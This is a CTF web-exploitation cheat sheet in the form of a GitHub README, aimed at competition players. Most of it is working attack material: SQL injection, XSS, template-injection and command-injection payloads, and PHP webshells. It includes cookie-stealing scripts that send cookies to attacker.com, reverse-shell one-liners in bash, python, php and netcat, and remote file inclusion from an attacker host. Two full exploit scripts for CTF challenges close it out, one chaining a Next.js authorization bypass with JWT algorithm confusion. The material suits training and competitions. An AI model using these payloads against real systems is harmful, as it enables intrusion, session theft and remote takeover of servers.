# CTF Cheatsheet 2025 🚀

> A comprehensive guide for Web Exploitation in Capture The Flag (CTF) competitions

[![GitHub stars](https://img.shields.io/github/stars/pugazhexploit/CTF_cheetsheet-2025?style=social)](https://github.com/pugazhexploit/CTF_cheetsheet-2025)
[![GitHub forks](https://img.shields.io/github/forks/pugazhexploit/CTF_cheetsheet-2025?style=social)](https://github.com/pugazhexploit/CTF_cheetsheet-2025/fork)
[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)

---

## 📑 Table of Contents

1. [Web Recon Basics](#1-web-recon-basics)
2. [Directory & File Enumeration](#2-directory--file-enumeration)
3. [HTTP Methods & Headers](#3-http-methods--headers)
4. [Authentication Bypass](#4-authentication-bypass)
5. [Session & Cookie Attacks](#5-session--cookie-attacks)
6. [SQL Injection (SQLi)](#6-sql-injection-sqli)
7. [Cross-Site Scripting (XSS)](#7-cross-site-scripting-xss)
8. [Cross-Site Request Forgery (CSRF)](#8-cross-site-request-forgery-csrf)
9. [File Upload Vulnerabilities](#9-file-upload-vulnerabilities)
10. [Local File Inclusion (LFI)](#10-local-file-inclusion-lfi)
11. [Remote File Inclusion (RFI)](#11-remote-file-inclusion-rfi)
12. [Server-Side Request Forgery (SSRF)](#12-server-side-request-forgery-ssrf)
13. [Command Injection](#13-command-injection)
14. [Template Injection](#14-template-injection)
15. [IDOR (Insecure Direct Object Reference)](#15-idor-insecure-direct-object-reference)
16. [Open Redirect](#16-open-redirect)
17. [JWT Attacks](#17-jwt-attacks)
18. [API Testing & Exploitation](#18-api-testing--exploitation)
19. [Rate Limiting & Brute Force](#19-rate-limiting--brute-force)
20. [WebSocket Attacks](#20-websocket-attacks)
21. [Source Code Disclosure](#21-source-code-disclosure)
22. [Debug & Misconfiguration Issues](#22-debug--misconfiguration-issues)
23. [Useful Payloads & Wordlists](#23-useful-payloads--wordlists)
24. [Automation Tools](#24-automation-tools)
25. [CTF Challenge Solutions](#25-ctf-challenge-solutions)

---

## 1. Web Recon Basics

### 🔍 Initial Reconnaissance

```bash
# Subdomain enumeration
subfinder -d target.com -o subdomains.txt
assetfinder --subs-only target.com
amass enum -d target.com

# DNS enumeration
dig target.com ANY
nslookup target.com
host -t any target.com

# WHOIS lookup
whois target.com

# Check robots.txt, sitemap.xml
curl https://target.com/robots.txt
curl https://target.com/sitemap.xml

# Technology fingerprinting
whatweb https://target.com
wappalyzer
builtwith.com
```

### 🌐 Port Scanning

```bash
# Nmap
nmap -sV -sC -p- target.com
nmap -p 80,443,8080 -A target.com

# Masscan (faster)
masscan -p1-65535 target.com --rate=1000
```

### 📸 Screenshots

```bash
# EyeWitness
eyewitness -f urls.txt --web

# Aquatone
cat urls.txt | aquatone
```

---

## 2. Directory & File Enumeration

```bash
# Gobuster
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,js

# Dirsearch
dirsearch -u https://target.com -e php,html,js,txt
dirsearch -u https://target.com -w /path/to/wordlist.txt

# Ffuf
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302 -fc 404

# Feroxbuster
feroxbuster -u https://target.com -w /usr/share/wordlists/dirb/common.txt

# Wfuzz
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 https://target.com/FUZZ
```

### 🎯 Common Files to Check

```
/.git/
/.env
/.DS_Store
/config.php
/phpinfo.php
/backup.zip
/database.sql
/admin/
/api/
/swagger/
graphql
```

---

## 3. HTTP Methods & Headers

### 🔧 HTTP Methods

```bash
# Test different HTTP methods
curl -X OPTIONS https://target.com -v
curl -X PUT https://target.com/file.txt -d "data" -v
curl -X DELETE https://target.com/file.txt -v
curl -X TRACE https://target.com -v

# Check allowed methods
curl -X OPTIONS https://target.com -i
```

### 📋 Important Headers

```bash
# Host Header Injection
curl -H "Host: evil.com" https://target.com

# X-Forwarded-For (IP Spoofing)
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com
curl -H "X-Forwarded-For: 192.168.1.1" https://target.com

# X-Original-URL / X-Rewrite-URL (Access Control Bypass)
curl -H "X-Original-URL: /admin" https://target.com

# Custom Headers
curl -H "X-Custom-IP-Authorization: 127.0.0.1" https://target.com
curl -H "X-Forwarded-Host: localhost" https://target.com
```

### 🎭 User-Agent Manipulation

```bash
curl -H "User-Agent: Googlebot/2.1" https://target.com
curl -H "User-Agent: () { :; }; echo vulnerable" https://target.com  # Shellshock
```

---

## 4. Authentication Bypass

### 🔓 Common Techniques

```bash
# SQL Injection in login
username: admin' OR '1'='1
password: admin' OR '1'='1

username: admin'--
password: anything

# NoSQL Injection
username[$ne]=admin&password[$ne]=password

# JWT manipulation (see JWT section)

# Session fixation
# Cookie manipulation

# Default credentials
admin:admin
admin:password
root:root
administrator:administrator
```

### 🕵️ Bypass Filters

```python
# Username enumeration
usernames = ['admin', 'root', 'user', 'test']
for user in usernames:
    response = requests.post(url, data={'username': user, 'password': 'wrong'})
    # Check response time, error messages, status codes
```

### 🔑 Password Reset Exploitation

```bash
# Parameter pollution
email=victim@target.com&email=attacker@evil.com

# Host header injection
Host: evil.com

# Token prediction
# Check for weak token generation
```

---

## 5. Session & Cookie Attacks

### 🍪 Cookie Manipulation

```bash
# View cookies
document.cookie  # In browser console

# Decode cookies
echo "base64string" | base64 -d

# Cookie flags to check
Secure
HttpOnly
SameSite

# Flask cookie decoding
flask-unsign --decode --cookie 'cookie_value'

# Try to forge
flask-unsign --sign --cookie "{'user': 'admin'}" --secret 'SECRET_KEY'
```

### 🔐 Session Attacks

```python
# Session fixation
import requests

session = requests.Session()
# Set session ID
session.cookies.set('PHPSESSID', 'fixed_session_id')
```

---

## 6. SQL Injection (SQLi)

### 💉 Basic Payloads

```sql
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
admin'#
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# Error-based
' AND 1=CONVERT(int, (SELECT @@version))--
' AND 1=CONVERT(int, (SELECT DB_NAME()))--

# Time-based
' OR SLEEP(5)--
' OR pg_sleep(5)--
'; WAITFOR DELAY '00:00:05'--

# Boolean-based
' AND 1=1--  # True
' AND 1=2--  # False
```

### 🛠️ SQLMap

```bash
# Basic scan
sqlmap -u "https://target.com/page?id=1" --dbs

# POST request
sqlmap -u "https://target.com/login" --data="username=admin&password=pass" --dbs

# Cookie-based
sqlmap -u "https://target.com/page" --cookie="PHPSESSID=value" --dbs

# Dump database
sqlmap -u "https://target.com/page?id=1" -D database_name --dump

# OS shell
sqlmap -u "https://target.com/page?id=1" --os-shell

# Bypass WAF
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment --random-agent
```

### 🎯 Advanced Techniques

```sql
# Extract data
' UNION SELECT username,password FROM users--

# File read (MySQL)
' UNION SELECT LOAD_FILE('/etc/passwd')--

# File write (MySQL)
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'--

# Database enumeration
' UNION SELECT table_name FROM information_schema.tables--
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
```

---

## 7. Cross-Site Scripting (XSS)

### 🚨 Basic Payloads

```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
```

### 🎭 Bypass Filters

```html
# Uppercase/lowercase
<ScRiPt>alert('XSS')</sCrIpT>

# Without spaces
<svg/onload=alert('XSS')>

# Without parentheses
<script>alert`XSS`</script>

# Encoding
%3Cscript%3Ealert('XSS')%3C/script%3E
&#60;script&#62;alert('XSS')&#60;/script&#62;

# Alternative tags
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<audio src=x onerror=alert(1)>
```

### 🍪 Cookie Stealing

```html
<script>
fetch('https://attacker.com/?cookie=' + document.cookie)
</script>

<script>
new Image().src='https://attacker.com/?cookie='+document.cookie
</script>

<img src=x onerror="this.src='https://attacker.com/?cookie='+document.cookie">
```

### 🔧 XSS Tools

```bash
# XSStrike
xsstrike -u "https://target.com/page?param=value"

# Dalfox
dalfox url https://target.com/page?param=value

# Manual testing
# Always check: input fields, URL parameters, HTTP headers
```

---

## 8. Cross-Site Request Forgery (CSRF)

### 📝 Basic CSRF PoC

```html
<!-- GET request -->
<img src="https://target.com/delete?id=123">

<!-- POST request -->
<form action="https://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="submit" value="Click me">
</form>

<script>
  document.forms[0].submit();
</script>
```

### 🎯 CSRF with JSON

```html
<script>
fetch('https://target.com/api/change-password', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({password: 'newpass123'})
});
</script>
```

### 🛡️ Bypass CSRF Tokens

```bash
# Remove token
# Change request method (POST to GET)
# Use another user's token
# Predict weak tokens
# Null or empty token value
```

---

## 9. File Upload Vulnerabilities

### 📤 Bypass Techniques

```bash
# Extension bypass
file.php
file.php.jpg
file.php.png
file.php%00.jpg
file.php%0a.jpg
file.php.....
file.PHP
file.phP
file.php3
file.php4
file.php5
file.phtml
file.phar

# MIME type manipulation
Content-Type: image/jpeg  # But upload PHP file

# Magic bytes (add to PHP file)
GIF89a;
<?php system($_GET['cmd']); ?>

# Double extension
file.jpg.php
file.php.jpg

# Null byte injection
file.php%00.jpg
file.php\x00.jpg
```

### 🎯 Webshells

```php
# Simple PHP shell
<?php system($_GET['cmd']); ?>

# Access: shell.php?cmd=whoami

# More advanced
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

### 🖼️ Image Upload Exploitation

```bash
# Exiftool metadata injection
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg image.php.jpg

# ImageTragick (CVE-2016-3714)
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|ls "-la)'
pop graphic-context
```

---

## 10. Local File Inclusion (LFI)

### 📁 Basic Payloads

```bash
# Linux
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/version
/var/log/apache2/access.log
/var/log/nginx/access.log
~/.bash_history
~/.ssh/id_rsa

# Windows
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\boot.ini
C:\xampp\apache\logs\access.log
```

### 🎯 Traversal Techniques

```bash
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
..\/..\/..\/etc/passwd

# Null byte
../../../etc/passwd%00
../../../etc/passwd%00.jpg

# PHP wrappers
php://filter/convert.base64-encode/resource=index.php
php://input  # + POST data
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
expect://whoami
```

### 🔧 Log Poisoning

```bash
# 1. Inject PHP code in User-Agent
curl -A "<?php system($_GET['cmd']); ?>" https://target.com

# 2. Include log file
https://target.com/?page=../../../var/log/apache2/access.log&cmd=whoami
```

---

## 11. Remote File Inclusion (RFI)

### 🌐 Basic RFI

```bash
# Include remote file
https://target.com/?page=http://attacker.com/shell.txt

# Create shell.txt on attacker server
<?php system($_GET['cmd']); ?>

# Execute
https://target.com/?page=http://attacker.com/shell.txt&cmd=whoami
```

### 🎯 RFI Techniques

```bash
# Using PHP wrappers
http://attacker.com/shell.php
ftp://attacker.com/shell.php

# SMB share (Windows)
\\attacker.com\share\shell.php
```

---

## 12. Server-Side Request Forgery (SSRF)

### 🎯 Basic SSRF

```bash
# Access internal services
http://localhost/admin
http://127.0.0.1/admin
http://0.0.0.0/admin
http://[::1]/admin
http://169.254.169.254/latest/meta-data/  # AWS metadata

# Port scanning
http://localhost:22
http://localhost:3306
http://localhost:6379
```

### 🔧 Bypass Techniques

```bash
# IP obfuscation
http://127.0.0.1
http://127.1
http://2130706433  # Decimal
http://0x7f.0x0.0x0.0x1  # Hexadecimal
http://0177.0000.0000.0001  # Octal

# DNS rebinding
http://localtest.me -> 127.0.0.1
http://customer1.app.localhost.my.company.127.0.0.1.nip.io

# Redirect
http://attacker.com/redirect -> http://localhost/admin

# URL encoding
http://127.0.0.1/%61dmin
```

### ☁️ Cloud Metadata

```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

---

## 13. Command Injection

### 💉 Basic Payloads

```bash
; whoami
| whoami
|| whoami
& whoami
&& whoami
`whoami`
$(whoami)
%0awhoami
%0dwhoami

```

### 🎯 Command Chaining

```bash
# Linux
; ls
| ls
|| ls
& ls
&& ls

# Both Linux and Windows
127.0.0.1 & whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
127.0.0.1 || whoami
```

### 🔧 Bypass Filters

```bash
# Without spaces
{cat,/etc/passwd}
cat</etc/passwd
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# Obfuscation
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
ca$@t /etc/passwd

# Environment variables
$PATH
$HOME
$USER
```

### 🚀 Reverse Shell

```bash
# Bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat
nc -e /bin/sh attacker.com 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
```

---

## 14. Template Injection

### 🎨 Server-Side Template Injection (SSTI)

```python
# Jinja2 (Python)
{{ 7*7 }}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{ config.items() }}
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}

# Flask/Jinja2 RCE
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# Twig (PHP)
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Smarty (PHP)
{php}echo `id`;{/php}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }

# Velocity (Java)
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
```

### 🔍 Detection

```bash
# Test various template engines
{{7*7}}  # = 49 (Jinja2, Twig)
${7*7}   # = 49 (Freemarker, Velocity)
<%= 7*7 %>  # = 49 (ERB)
${{7*7}}  # = 49 (Various)
```

---

## 15. IDOR (Insecure Direct Object Reference)

### 🎯 Common Targets

```bash
# User IDs
/user/profile?id=123
/api/user/456

# Document IDs
/document/view?doc=789
/download?file=report_123.pdf

# Order IDs
/order/details?order_id=1001
```

### 🎧 Testing Methodology

```python
import requests

# Test sequential IDs
for user_id in range(1, 100):
    response = requests.get(f'https://target.com/api/user/{user_id}', 
                          cookies={'session': 'your_session'})
    if response.status_code == 200:
        print(f'User {user_id}: {response.json()}')
```

### 🎭 Bypass Techniques

```bash
# Try different HTTP methods
GET /api/user/123
POST /api/user/123
PUT /api/user/123
DELETE /api/user/123

# Parameter pollution
/api/user?id=123&id=456

# Encoded values
/api/user/MTIz  # Base64
/api/user/7b  # Hexadecimal

# GUID/UUID prediction
# Check for weak or predictable UUIDs
```

---

## 16. Open Redirect

### 🔀 Basic Payloads

```bash
?url=https://evil.com
?redirect=https://evil.com
?next=https://evil.com
?return=https://evil.com
?returnUrl=https://evil.com
?return_url=https://evil.com
?checkout_url=https://evil.com
?continue=https://evil.com
?dest=https://evil.com
?destination=https://evil.com
?redir=https://evil.com
?redirect_uri=https://evil.com
?rurl=https://evil.com
?target=https://evil.com
?view=https://evil.com
```

### 🎯 Bypass Filters

```bash
# Protocol bypass
//evil.com
///evil.com
////evil.com
https:evil.com
https:/evil.com

# @ character
https://target.com@evil.com

# Subdomain
https://target.com.evil.com

# URL encoding
https://%65%76%69%6C%2E%63%6F%6D

# Null byte
https://target.com?redirect=https://evil.com%00.target.com

# Backslash
https://target.com?redirect=https://evil.com\@target.com
```

---

## 17. JWT Attacks

### 🔑 JWT Structure

```
Header.Payload.Signature

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.signature
```

### 🎯 Attack Techniques

```python
# 1. None algorithm
# Change "alg": "HS256" to "alg": "none"
# Remove signature

# 2. Algorithm confusion (RS256 to HS256)
import jwt

# Get public key
public_key = """-----BEGIN PUBLIC KEY-----
...
-----END PUBLIC KEY-----"""

# Create token signed with public key
payload = {"username": "admin"}
token = jwt.encode(payload, public_key, algorithm="HS256")

# 3. Weak secret brute force
# Use jwt_tool or hashcat
```

### 🛠️ JWT Tools

```bash
# jwt_tool
jwt_tool <JWT> -C -d secrets.txt

# Decode JWT
jwt_tool <JWT>

# Tamper JWT
jwt_tool <JWT> -T

# jwt-cracker
jwt-cracker <JWT> <alphabet> <max-length>

# John the Ripper
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
```

### 🎯 CTF Challenge: Next Jason (CVE-2025-29927)

**Vulnerability:** Next.js Authorization Bypass + JWT Algorithm Confusion

**Solution:**

```python
import requests
import jwt
from urllib.parse import *

URL = 'http://a370afda41a7.challs.ctf.r0devnull.team:8001/'

########## "Fix" pyjwt
# pyjwt's HMACAlgorithm doesn't allow using public keys as secrets, so
# we override it here, removing the check
def prepare_key(self, key):
    key = jwt.utils.force_bytes(key)
    return key

jwt.algorithms.HMACAlgorithm.prepare_key = prepare_key

class Exploit:
    def __init__(self, url=URL):
        self.url = url

    def getPublicKey(self):
        headers = {"x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"}
        req = requests.get(urljoin(self.url, "api/getPublicKey"), headers=headers)
        return req.json()['PUBKEY']

    def keyConfusion(self):
        pubkey = self.getPublicKey()
        payload = {"username": "admin"}
        forgedJWT = jwt.encode(payload, pubkey, algorithm="HS256")
        return forgedJWT

    def getFlag(self):
        headers = {
            "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware",
            "Cookie": f"token={self.keyConfusion()}"
        }
        req = requests.get(urljoin(self.url, "api/getFlag"), headers=headers)
        return req.json()

if __name__ == '__main__':
    run = Exploit()
    print(run.getFlag())
```

**Attack Flow:**
1. Bypass Next.js authorization using `x-middleware-subrequest` header
2. Get public key from `/api/getPublicKey` endpoint
3. Forge JWT with algorithm confusion (RS256 → HS256)
4. Sign token with public key as HMAC secret
5. Access `/api/getFlag` with forged token

---

## 18. API Testing & Exploitation

### 🔍 API Reconnaissance

```bash
# Common API endpoints
/api/
/api/v1/
/api/v2/
/graphql
/swagger
/swagger.json
/swagger-ui
/api-docs
/openapi.json
/wadl
/wsdl

# GraphQL introspection
{__schema{types{name,fields{name}}}}
```

### 🎯 REST API Testing

```bash
# Curl commands
curl -X GET https://api.target.com/users
curl -X POST https://api.target.com/users -H "Content-Type: application/json" -d '{"name":"test"}'
curl -X PUT https://api.target.com/users/1 -d '{"name":"updated"}'
curl -X DELETE https://api.target.com/users/1

# Check for mass assignment
POST /api/users
{"username": "test", "email": "test@test.com", "isAdmin": true}

# Parameter pollution
/api/user?id=1&id=2

# Excessive data exposure
/api/users/1  # Returns all user data including sensitive info
```

### 🔧 GraphQL Exploitation

```graphql
# Introspection query
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}

# Query batching (DoS)
query {
  user1: user(id: 1) { name }
  user2: user(id: 2) { name }
  ...
  user1000: user(id: 1000) { name }
}

# Nested query (DoS)
query {
  users {
    posts {
      comments {
        author {
          posts {
            comments {
              # ... deeply nested
            }
          }
        }
      }
    }
  }
}
}
```

---

## 19. Rate Limiting & Brute Force

### 🔨 Bypass Rate Limiting

```bash
# IP rotation
X-Forwarded-For: 1.2.3.4
X-Forwarded-For: 127.0.0.1
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Client-IP: 1.2.3.4

# Using null bytes
username=admin%00
username=admin%0d%0a

# Case manipulation
username=Admin
username=ADMIN
username=aDmIn
```

### 🎯 Brute Force Tools

```bash
# Hydra
hydra -l admin -P passwords.txt https://target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Medusa
medusa -h target.com -u admin -P passwords.txt -M http -m DIR:/login

# Ffuf
ffuf -w passwords.txt -X POST -d "username=admin&password=FUZZ" -u https://target.com/login -mc 200,302

# Burp Intruder
# Use Burp Suite's Intruder with payload positions
```

### 🔐 2FA Bypass

```bash
# Missing 2FA implementation on critical functions
# Reuse old 2FA tokens
# Brute force 2FA codes (if short)
# CSRF on 2FA disabling
# API endpoints without 2FA
# Response manipulation (change false to true)
```

---

## 20. WebSocket Attacks

### 🔌 WebSocket Basics

```javascript
// Connect to WebSocket
var ws = new WebSocket("wss://target.com/socket");

ws.onopen = function() {
  ws.send("Hello Server!");
};

ws.onmessage = function(event) {
  console.log("Received: " + event.data);
};

// Send data
ws.send(JSON.stringify({action: "subscribe", channel: "admin"}));
```

### 🎯 WebSocket Exploitation

```javascript
// CSWSH (Cross-Site WebSocket Hijacking)
<script>
var ws = new WebSocket("wss://target.com/socket");
ws.onopen = function() {
  ws.send("Get sensitive data");
};
ws.onmessage = function(event) {
  fetch('https://attacker.com/?data=' + event.data);
};
</script>

// Message injection
ws.send('{"user":"admin","message":"<script>alert(1)</script>"}');

// Authentication bypass
// Send messages without proper authentication
```

### 🛠️ WebSocket Testing Tools

```bash
# wscat
wscat -c wss://target.com/socket

# Send message
> {"action": "getUsers"}

# wssip (WebSocket Manipulation Proxy)
# Use with Burp Suite
```

---

## 21. Source Code Disclosure

### 📂 Common Sources

```bash
# Git exposure
/.git/
/.git/config
/.git/HEAD
/.git/logs/HEAD

# Tool: GitDumper
git-dumper https://target.com/.git/ output/

# SVN exposure
/.svn/
/.svn/entries

# Backup files
/backup.zip
/backup.tar.gz
/www.zip
/site.zip
/db_backup.sql
/database.sql

# Source code files
/index.php.bak
/config.php~
/config.php.old
/config.php.swp
/.config.php.swp

# IDE files
/.vscode/
/.idea/
/.DS_Store

# Environment files
/.env
/.env.local
/.env.production
/config.json
```

### 🔍 Techniques

```bash
# Directory listing
https://target.com/uploads/
https://target.com/backups/

# Path traversal to source
https://target.com/download?file=../../index.php

# PHP source via filter
https://target.com/?page=php://filter/convert.base64-encode/resource=index.php

# Comments in HTML
<!-- TODO: Remove debug mode -->
<!-- Admin panel: /secret_admin_panel -->
```

---

## 22. Debug & Misconfiguration Issues

### 🐛 Debug Mode

```bash
# Flask debug mode
# Werkzeug debugger with console access

# Django debug
DEBUG = True
# Shows full stack traces, SQL queries, settings

# PHP errors
display_errors = On
error_reporting = E_ALL

# Stack traces
# Look for file paths, database credentials, API keys
```

### ⚙️ Common Misconfigurations

```bash
# CORS misconfiguration
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

# Security headers missing
X-Frame-Options
X-XSS-Protection
Content-Security-Policy
Strict-Transport-Security

# Directory listing enabled
Options +Indexes

# Default credentials
# Check documentation for default admin credentials

# Outdated software
# Check for known CVEs
```

### 🔑 Exposed Secrets

```bash
# API keys in JavaScript
# Search for:
api_key=
apikey=
api-key=
secret=
password=
token=

# GitHub commits
# Check git history for secrets
git log -p | grep -i "password\|key\|secret"

# Environment variables
/proc/self/environ
```

---

## 23. Useful Payloads & Wordlists

### 📚 Wordlists

```bash
# SecLists (Must-have)
https://github.com/danielmiessler/SecLists

# Common paths
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt

# Passwords
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
/usr/share/wordlists/rockyou.txt

# Fuzzing
/usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt
/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt
```

### 🎯 Payload Collections

```bash
# PayloadsAllTheThings
https://github.com/swisskyrepo/PayloadsAllTheThings

# OWASP Cheat Sheets
https://cheatsheetseries.owasp.org/

# HackTricks
https://book.hacktricks.xyz/
```

---

## 24. Automation Tools

### 🤖 All-in-One Tools

```bash
# Burp Suite
# The ultimate web testing tool
# Professional version recommended for CTFs

# OWASP ZAP
zap.sh -cmd -quickurl https://target.com

# Nuclei
nuclei -u https://target.com -t cves/
nuclei -l urls.txt -t nuclei-templates/

# Nikto
nikto -h https://target.com
```

### 🔍 Specialized Tools

```bash
# XSS
dalfox url https://target.com/?param=value
xsstrike -u https://target.com/?param=value

# SQLi
sqlmap -u https://target.com/?id=1 --batch

# Directory brute force
ffuf -u https://target.com/FUZZ -w wordlist.txt

# Subdomain enumeration
subfinder -d target.com | httpx
```

### 📜 Scripting

```python
# Custom Python scripts
import requests

def test_parameter(url, param, payloads):
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        response = requests.get(test_url)
        if "error" not in response.text.lower():
            print(f"[+] Potential vulnerability: {test_url}")

# Usage
payloads = ["'", '"', '<script>', "' OR '1'='1"]
test_parameter("https://target.com/search", "q", payloads)
```

---

## 25. CTF Challenge Solutions

### 🎯 Challenge 1: Host Header Bypass

**Vulnerability:** Request Handler - Host Header and Path Manipulation

The application reads the `Host` header and URI path, then validates:
- Host must equal `127.0.0.1`
- URI path must NOT start with `/flag`

**Solution:**

```python
import requests
from urllib.parse import *

URL = 'http://public.ctf.r0devnull.team:3003/'

class Exploit:
    def __init__(self, url=URL):
        self.url = url

    def getFlag(self):
        headers = {"Host": "127.0.0.1"}
        # Use path traversal with multiple slashes to bypass filter
        req = requests.get(
            urljoin(self.url, "////public.ctf.r0devnull.team:3003/flag"),
            headers=headers
        )
        return req.text

if __name__ == '__main__':
    run = Exploit()
    print(run.getFlag())
```

**Explanation:**
1. Set `Host: 127.0.0.1` to pass the host check
2. Use `////public.ctf.r0devnull.team:3003/flag` path
   - The multiple slashes bypass the "starts with `/flag`" check
   - After normalization, still reaches the flag endpoint
3. Retrieve the flag!

---

### 🎯 Challenge 2: Next Jason (CVE-2025-29927)

**Vulnerability Chain:**
1. CVE-2025-29927 (Next.js Authorization Bypass)
2. JWT Algorithm Confusion Attack

**Solution:** (See [JWT Attacks](#17-jwt-attacks) section above)

**Exploitation Steps:**

1. **Bypass Next.js Authorization:**
   - Use `x-middleware-subrequest` header to bypass middleware checks
   - Access protected `/api/getPublicKey` endpoint

2. **Extract Public Key:**
   - Retrieve RSA public key used for JWT verification

3. **Algorithm Confusion:**
   - Change JWT algorithm from RS256 to HS256
   - Sign new token with public key as HMAC secret
   - Create payload: `{\"username\": \"admin\"}`

4. **Access Protected Endpoint:**
   - Use forged JWT to access `/api/getFlag`
   - Retrieve the flag!

---

## 🛡️ Defense & Remediation

### Security Best Practices

```bash
# Input validation
- Whitelist allowed characters
- Validate data types and formats
- Use parameterized queries

# Authentication
- Implement strong password policies
- Use multi-factor authentication
- Secure session management

# Authorization
- Implement proper access controls
- Use principle of least privilege
- Validate permissions on every request

# Output encoding
- Encode user input in output
- Use Content-Security-Policy
- Set proper CORS policies

# Security headers
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000
Content-Security-Policy: default-src 'self'
```

---

## 📖 Resources

### 🌐 Learning Platforms

- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [PentesterLab](https://pentesterlab.com/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [PicoCTF](https://picoctf.org/)
- [OverTheWire](https://overthewire.org/)

### 📚 References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
- [PortSwigger Cheat Sheets](https://portswigger.net/web-security/all-topics)
- [SecLists](https://github.com/danielmiessler/SecLists)

### 🎓 Books

- "The Web Application Hacker's Handbook" by Dafydd Stuttard
- "Real-World Bug Hunting" by Peter Yaworski
- "Bug Bounty Bootcamp" by Vickie Li

---

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

---

## ⚖️ Legal Disclaimer

This repository is for **educational purposes only**. The tools and techniques described here should only be used:

- On systems you own
- On systems you have explicit permission to test
- In legal CTF competitions and training environments

**Unauthorized access to computer systems is illegal.** The author is not responsible for any misuse of this information.

---

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 📬 Contact

